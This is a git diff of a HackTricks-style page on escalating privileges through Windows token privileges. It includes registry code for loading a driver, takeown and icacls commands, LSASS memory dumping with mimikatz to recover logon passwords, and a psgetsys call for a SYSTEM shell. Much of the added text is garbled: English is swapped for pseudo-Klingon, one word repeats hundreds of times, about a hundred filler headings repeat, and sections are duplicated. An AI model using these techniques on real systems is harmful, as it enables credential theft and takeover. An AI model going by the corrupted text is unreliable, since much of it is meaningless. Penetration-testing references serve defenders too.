@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>
 
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
@@ -74,9 +74,9 @@ SeCreateTokenPrivilege is a powerful permission, especially useful when a user p
 
 ### SeLoadDriverPrivilege
 
-Thi privilege allows to **load and unload device drivers** with the creation of a registry entry with specific values for `ImagePath` and `Type`. Since direct write access to `HKLM` (HKEY_LOCAL_MACHINE) is restricted, `HKCU` (HKEY_CURRENT_USER) must be utilized instead. However, to make `HKCU` recognizable to the kernel for driver configuration, a specific path must be followed. 
+Thi privilege allows to **load and unload device drivers** with the creation of a registry entry with specific values for `ImagePath` and `Type`. Since direct write access to `HKLM` (HKEY_LOCAL_MACHINE) is restricted, `HKCU` (HKEY_CURRENT_USER) must be utilized instead. However, to make `HKCU` recognizable to the kernel for driver configuration, a specific path must be followed.
 
-This path is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, where `<RID>` is the Relative Identifier of the current user. Inside `HKCU`, this entire path must be created, and two values need to be set: 
+This path is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, where `<RID>` is the Relative Identifier of the current user. Inside `HKCU`, this entire path must be created, and two values need to be set:
 - `ImagePath`, which is the path to the binary to be executed
 - `Type`, with a value of `SERVICE_KERNEL_DRIVER` (`0x00000001`).
 
@@ -85,7 +85,6 @@ This path is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`
 2. Create the path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` within `HKCU`, where `<RID>` represents the current user's Relative Identifier.
 3. Set the `ImagePath` to the binary's execution path.
 4. Assign the `Type` as `SERVICE_KERNEL_DRIVER` (`0x00000001`).
-
 ```python
 # Example Python code to set the registry values
 import winreg as reg
@@ -97,13 +96,9 @@ reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
 reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
 reg.CloseKey(key)
 ```
-
-More ways to abuse this privilege in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)
-
 ### SeTakeOwnershipPrivilege
 
-This is similar to to **SeRestorePrivilege**. Its primary function allows a process to **assume ownership of an object**, circumventing the requirement for explicit discretionary access through the provision of WRITE_OWNER access rights. The process involves first securing ownership of the intended registry key for writing purposes, then altering the DACL to enable write operations.
-
+**SeTakeOwnershipPrivilege** jupwI' 'ej **SeRestorePrivilege** vItlhutlh. vItlhutlh vItlhutlh **SeRestorePrivilege** vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlh
 ```bash
 takeown /f 'C:\some\file.txt' #Now the file is owned by you
 icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
@@ -119,24 +114,21 @@ icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
 %WINDIR%\system32\config\default.sav
 c:\inetpub\wwwwroot\web.config
 ```
-
 ### SeDebugPrivilege
 
-This privilege permits the **debug other processes**, including to read and write in the memore. Various strategies for memory injection, capable of evading most antivirus and host intrusion prevention solutions, can be employed with this privilege.
+**SeDebugPrivilege** jupwI' **debug lo'laHbe'**, memore vItlhutlhlaHbe' 'ej vItlhutlhlaHbe' 'e' vItlhutlhlaHbe'. 'Iv 'oH strategies memory injection, antivirus 'ej host intrusion prevention solutions, vItlhutlhlaHbe' 'e' vItlhutlhlaHbe' 'e' vItlhutlhlaHbe'.
 
 #### Dump memory
 
-You could use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) to **capture the memory of a process**. Specifically, this can apply to the **Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service))** process, which is responsible for storing user credentials once a user has successfully logged into a system.
+[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **capture the memory of a process**. 'Iv 'oH, **Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service))** process, 'oH responsible storing user credentials once a user has successfully logged into a system.
 
 You can then load this dump in mimikatz to obtain passwords:
-
 ```
 mimikatz.exe
 mimikatz # log
 mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonpasswords
 ```
-
 #### RCE
 
 If you want to get a `NT SYSTEM` shell you could use:
@@ -144,28 +136,459 @@ If you want to get a `NT SYSTEM` shell you could use:
 * ****[**SeDebugPrivilegePoC**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)****
 * ****[**psgetsys.ps1**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)****
 
+#### RCE
+
+ghItlhvam 'ej `NT SYSTEM` shell ghaHtaHvIS:
+
+* ****[**SeDebugPrivilegePoC**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)****
+* ****[**psgetsys.ps1**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)****
 ```powershell
 # Get the PID of a process running as NT SYSTEM
 import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
 ```
+## QapHa' pagh
 
-## Check privileges
+### QapHa' pagh
 
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e' yIDel. 
+
+### QapHa' pagh
+
+QapHa' pagh 'e' yIDel. 'ej QapHa' pagh 'e
 ```
 whoami /priv
 ```
-
-The **tokens that appear as Disabled** can be enable, you you actually can abuse _Enabled_ and _Disabled_ tokens.
+**tokens that appear as Disabled** can be enable, you you actually can abuse _Enabled_ and _Disabled_ tokens.
 
 ### Enable All the tokens
 
 If you have tokens disables, you can use the script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) to enable all the tokens:
 
+**tokens vItlhutlh** qar'a'neS, 'ej _Enabled_ 'ej _Disabled_ tokens abuse 'e' vItlhutlh.
+
+### Enable All the tokens
+
+tokens vItlhutlh 'e' vItlhutlh, 'ej [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) script vIlo'laHbe'chugh tokens vItlhutlh:
 ```powershell
 .\EnableAllTokenPrivs.ps1
 whoami /priv
 ```
-
 Or the **script** embed in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).
 
 ## Table
@@ -174,7 +597,7 @@ Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](http
 
 | Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
 | -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
